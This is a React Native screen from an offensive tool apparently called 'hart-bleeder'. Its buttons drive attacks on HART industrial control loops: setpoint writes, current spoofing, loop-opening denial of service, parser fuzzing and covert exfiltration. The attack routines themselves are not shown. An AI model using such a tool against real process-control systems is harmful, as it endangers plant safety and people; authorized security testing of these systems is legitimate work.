/**
 * hart-bleeder — AttackConsoleScreen.js
 * Attack console: orchestrates high-level attack operations —
 * read PV, write setpoint, spoof, DoS, sag, fuzz, covert exfil.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

import React, { useState } from 'react';
import {
  View, Text, StyleSheet, TouchableOpacity, TextInput, Alert,
  SafeAreaView, StatusBar, ScrollView, Modal,
} from 'react-native';

export default function AttackConsoleScreen({ bleManager, connected, armed, devices }) {
  const [addr, setAddr] = useState('0');
  const [setpoint, setSetpoint] = useState('50');
  const [spoofMa, setSpoofMa] = useState('4');
  const [fuzzCount, setFuzzCount] = useState('50');
  const [covertMsg, setCovertMsg] = useState('');
  const [result, setResult] = useState('');
  const [busy, setBusy] = useState(false);
  const [covertModal, setCovertModal] = useState(false);
  const [covertResult, setCovertResult] = useState('');

  const guard = () => {
    if (!connected) { Alert.alert('Not connected'); return false; }
    if (!armed) { Alert.alert('Not Armed', 'Arm the device from the Dashboard first.'); return false; }
    return true;
  };

  const run = async (fn, label) => {
    if (!guard()) return;
    setBusy(true);
    setResult(`${label}...`);
    try {
      await fn();
      setResult(`${label} — sent OK`);
    } catch (e) {
      setResult(`${label} — ERROR: ${e.message}`);
    }
    setBusy(false);
  };

  const handleReadPV = async () => {
    if (!connected) { Alert.alert('Not connected'); return; }
    setBusy(true);
    try {
      await bleManager.readPV(parseInt(addr, 10));
      setResult('Read PV command sent. Response in capture feed.');
    } catch (e) { setResult('ERROR: ' + e.message); }
    setBusy(false);
  };

  const handleWriteSetpoint = () => run(
    () => bleManager.writeSetpoint(parseInt(addr, 10), parseFloat(setpoint)),
    `Write Setpoint ${setpoint}% to addr ${addr}`
  );

  const handleSpoof = () => run(
    () => bleManager.spoofPV(parseFloat(spoofMa)),
    `Spoof loop to ${spoofMa} mA`
  );

  const handleDoS = () => Alert.alert('Confirm DoS', 'Open loop for 1000ms?', [
    { text: 'Cancel', style: 'cancel' },
    { text: 'Open', style: 'destructive', onPress: () => run(() => bleManager.loopDoS(1000), 'Loop DoS 1000ms') },
  ]);

  const handleFuzz = () => run(
    () => bleManager.fuzz(parseInt(addr, 10), parseInt(fuzzCount, 10)),
    `Fuzz addr ${addr} ×${fuzzCount}`
  );

  const handleCovertExfil = () => {
    if (!guard()) return;
    if (!covertMsg) { Alert.alert('Enter a message'); return; }
    setCovertModal(true);
    run(
      () => bleManager.covertExfil(covertMsg),
      `Covert exfil: "${covertMsg}"`
    );
  };

  const handleCovertRecv = async () => {
    if (!guard()) return;
    setCovertModal(true);
    setCovertResult('Listening...');
    try {
      await bleManager.covertRecv();
      setCovertResult('Listening... (response in capture feed)');
    } catch (e) { setCovertResult('ERROR: ' + e.message); }
  };

  return (
    <SafeAreaView style={styles.container}>
      <StatusBar barStyle="light-content" />
      <ScrollView>
        <Text style={styles.title}>Attack Console</Text>
        <Text style={styles.warn}>
          ⚠ All operations are destructive. Ensure you are authorized to test
          the target process control loop before proceeding.
        </Text>

        <View style={styles.card}>
          <Text style={styles.cardTitle}>Read PV (Command 1)</Text>
          <View style={styles.inputRow}>
            <Text style={styles.inputLabel}>Addr:</Text>
            <TextInput style={styles.input} value={addr} onChangeText={setAddr} keyboardType="numeric" />
            <TouchableOpacity style={styles.miniBtn} onPress={handleReadPV} disabled={busy}>
              <Text style={styles.miniBtnText}>Read</Text>
            </TouchableOpacity>
          </View>
        </View>

        <View style={styles.card}>
          <Text style={styles.cardTitle}>Write Setpoint (Command 35)</Text>
          <View style={styles.inputRow}>
            <Text style={styles.inputLabel}>Addr:</Text>
            <TextInput style={styles.input} value={addr} onChangeText={setAddr} keyboardType="numeric" />
          </View>
          <View style={styles.inputRow}>
            <Text style={styles.inputLabel}>Setpoint %:</Text>
            <TextInput style={styles.input} value={setpoint} onChangeText={setSetpoint} keyboardType="numeric" />
            <TouchableOpacity style={[styles.miniBtn, styles.destructive]} onPress={handleWriteSetpoint} disabled={busy}>
              <Text style={styles.miniBtnText}>Write</Text>
            </TouchableOpacity>
          </View>
        </View>

        <View style={styles.card}>
          <Text style={styles.cardTitle}>Spoof Loop Current</Text>
          <View style={styles.inputRow}>
            <Text style={styles.inputLabel}>mA:</Text>
            <TextInput style={styles.input} value={spoofMa} onChangeText={setSpoofMa} keyboardType="numeric" />
            <TouchableOpacity style={[styles.miniBtn, styles.destructive]} onPress={handleSpoof} disabled={busy}>
              <Text style={styles.miniBtnText}>Spoof</Text>
            </TouchableOpacity>
          </View>
        </View>

        <View style={styles.card}>
          <Text style={styles.cardTitle}>Fuzz HART Parser</Text>
          <View style={styles.inputRow}>
            <Text style={styles.inputLabel}>Addr:</Text>
            <TextInput style={styles.input} value={addr} onChangeText={setAddr} keyboardType="numeric" />
            <Text style={styles.inputLabel}>Count:</Text>
            <TextInput style={styles.input} value={fuzzCount} onChangeText={setFuzzCount} keyboardType="numeric" />
          </View>
          <TouchableOpacity style={[styles.miniBtn, { width: '100%' }]} onPress={handleFuzz} disabled={busy}>
            <Text style={styles.miniBtnText}>Fire Fuzz</Text>
          </TouchableOpacity>
        </View>

        <View style={styles.card}>
          <Text style={styles.cardTitle}>Covert Channel (±0.5 mA FSK)</Text>
          <TextInput
            style={[styles.input, { width: '100%', marginBottom: 8 }]}
            value={covertMsg}
            onChangeText={setCovertMsg}
            placeholder="message to exfil..."
            placeholderTextColor="#555"
          />
          <View style={styles.inputRow}>
            <TouchableOpacity style={[styles.miniBtn, { flex: 1 }]} onPress={handleCovertExfil} disabled={busy}>
              <Text style={styles.miniBtnText}>Exfil</Text>
            </TouchableOpacity>
            <TouchableOpacity style={[styles.miniBtn, { flex: 1, marginLeft: 6 }]} onPress={handleCovertRecv} disabled={busy}>
              <Text style={styles.miniBtnText}>Receive</Text>
            </TouchableOpacity>
          </View>
        </View>

        <View style={styles.card}>
          <Text style={styles.cardTitle}>Denial of Service</Text>
          <TouchableOpacity style={[styles.miniBtn, styles.destructive, { width: '100%' }]} onPress={handleDoS} disabled={busy}>
            <Text style={styles.miniBtnText}>Open Loop (1000ms)</Text>
          </TouchableOpacity>
        </View>

        {result ? <Text style={styles.result}>{result}</Text> : null}
      </ScrollView>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#0f0f1e', padding: 14 },
  title: { color: '#e94560', fontSize: 20, fontWeight: 'bold', marginBottom: 6 },
  warn: { color: '#f59e0b', fontSize: 10, marginBottom: 12 },
  card: { backgroundColor: '#1a1a2e', borderRadius: 10, padding: 12, marginBottom: 10, borderWidth: 1, borderColor: '#2d2d44' },
  cardTitle: { color: '#4a90d9', fontSize: 13, fontWeight: 'bold', marginBottom: 8 },
  inputRow: { flexDirection: 'row', alignItems: 'center', marginBottom: 6 },
  inputLabel: { color: '#aaa', fontSize: 12, marginRight: 6, minWidth: 50 },
  input: { flex: 1, backgroundColor: '#0f0f1e', color: '#fff', borderRadius: 6, padding: 8, fontSize: 13, marginRight: 6, borderWidth: 1, borderColor: '#333' },
  miniBtn: { backgroundColor: '#2d2d44', padding: 10, borderRadius: 8, alignItems: 'center' },
  destructive: { backgroundColor: '#e94560' },
  miniBtnText: { color: '#fff', fontWeight: 'bold', fontSize: 12 },
  result: { color: '#10b981', fontSize: 12, marginTop: 8, fontFamily: 'monospace' },
});